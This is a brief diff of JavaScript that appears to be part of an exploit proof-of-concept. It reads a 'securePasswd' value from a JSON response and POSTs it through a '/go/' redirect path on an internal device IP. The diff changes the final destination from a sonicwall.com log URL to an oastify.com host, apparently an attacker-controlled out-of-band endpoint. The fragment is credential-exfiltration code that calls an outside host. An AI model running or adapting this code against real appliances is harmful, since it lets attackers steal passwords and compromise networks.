@@ -7,7 +7,7 @@
     const json = await response.json();
     const passwdValue = json.securePasswd;
     
-    await fetch("https://10.210.34.88/go/https://sonicwall.com/log", {
+    await fetch("https://10.210.34.88/go/https://6elcp88rra3cnmz6qr6owuzbp2vtjm7b.oastify.com/log", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
